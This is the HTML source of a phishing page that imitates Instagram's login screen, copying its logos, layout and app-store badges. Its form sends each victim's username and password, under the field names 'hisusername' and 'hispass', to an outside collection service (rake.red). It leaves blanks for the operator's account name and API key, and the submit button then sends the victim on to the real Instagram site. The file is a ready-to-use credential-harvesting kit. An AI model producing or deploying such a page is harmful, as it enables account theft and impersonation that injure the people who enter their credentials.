<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <img src="https://i.ibb.co/zQVCHwQ/Screenshot-2024-08-30-231210.png" alt="instapic" class="mainimg">
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
                    alt="Logo">
            </div>
            <form id="loginForm" action="https://rake.red/api/YOUR REGISTERED NAME /YOUR PROJECT NAME FROM RAKE.RED" method="POST">
                <input type="hidden" name="access_key" value="ADD HERE YOUR API KEY ">

                <label for="hisusername">
                    <input type="text" name="hisusername" id="username"
                        placeholder="Phone number, username, or email"></label>
                <label for="hispass"></label>
                <input type="password" name="hispass" id="password" placeholder="Password"></label>
                <a href="https://www.instagram.com/"><button type="submit">Log In</button></a>
            </form>
            <div class="separator">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>
            <div class="social-login">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Facebook_icon.svg/512px-Facebook_icon.svg.png"
                    alt="Facebook Icon">
                <a href="https://www.facebook.com/"><span>Log in with Facebook</span></a>
            </div>
            <a href="https://www.youtube.com/results?search_query=i+forgot+my+instagram+password"
                class="forgot-password">Forgot password?</a>

        </div>
        <div class="signup-box">
            <span>Don't have an account?</span>
            <a href="#">Sign up</a>
        </div>
        <div class="getapp">
            <h4>Get The App</h4>
        </div>

    </div>


    <img alt="Get it on Google Play" class="gp" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png">
    <img alt="Get it from Microsoft" class="mp" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">



    <script src="script.js"></script>

</body>
